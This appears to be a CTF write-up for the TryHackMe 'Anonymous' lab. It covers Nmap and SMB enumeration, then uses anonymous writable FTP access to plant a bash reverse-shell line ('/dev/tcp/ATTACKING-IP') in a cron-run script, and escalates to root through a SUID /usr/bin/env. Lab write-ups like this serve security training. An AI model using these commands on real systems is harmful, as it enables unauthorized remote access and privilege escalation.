---
title: Anonymous
date: 2021-12-1 11:11:11 +/-TTTT
categories: [CTF, tryhackme]
tags: [ftp, suid]
---

Not the hacking group

|Machine Name | Date | Level | Type |
|-------------|-------|------|------|
| Anonymous | 2 Dec 2021 | Medium | ctf |

![infocard](https://tryhackme-images.s3.amazonaws.com/room-icons/876a5185c429c9703e625cb48c39637b.png)


## Reconnaissance

Start the recon with Nmap.

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-07 09:36 EDT
Nmap scan report for 10.10.187.181
Host is up (0.16s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.133.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2021-10-07T13:36:24+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-07T13:36:24
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .


```

According to  Nmap output we got SSH, FTP and SMB services to test.

### smb

enumerate the  `pics` share.

```bash
smbclient -L //$ip/
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

```

Log in to `pics` share.

```bash
smbclient //$ip/pics
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 07:11:34 2020
  ..                                  D        0  Wed May 13 21:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020

                20508240 blocks of size 1024. 13306816 blocks available

```

Downloaded those files and check for stego but it's just a rabbit hole.

### ftp

Nmap show's that we can log in as anonymous on the FTP and the FTP server is also writable. Let's log in and check the server.

there is `scripts` folder in the server with some files.

```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000          946 Dec 02 14:44 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.

```

We can assume that a cronjob is set for `clean.sh`. let's download all the files and find out what it doing.

`clean.sh` 

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi

```

This script is checking files in `/tmp` directory and if it found any files then delete it and add the file name to file `removed_files.log` with the date.

FTP server is writable so we can mount it and add our reverse shell in `clean.sh`.

## Gaining Access

Let's Mount FTP server using `curlftpfs`.

`curlftpfs anonymous@$ip mount/`

using vim added bash reverse shellcode.

`bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1`

After some time we get a shell as `namelessone`.

![wwwshel](/assets/thm/anonymous/wwwshell.png)


## Privilege Escalation

### Namelessone to root

After some enumeration, I found out that the SUID bit is set to `/usr/bin/env`.

`/usr/bin/env /bin/sh -p`

Got root.

```bash
namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
/usr/bin/env /bin/sh -p
whoami
root
```

## Resources

****blank****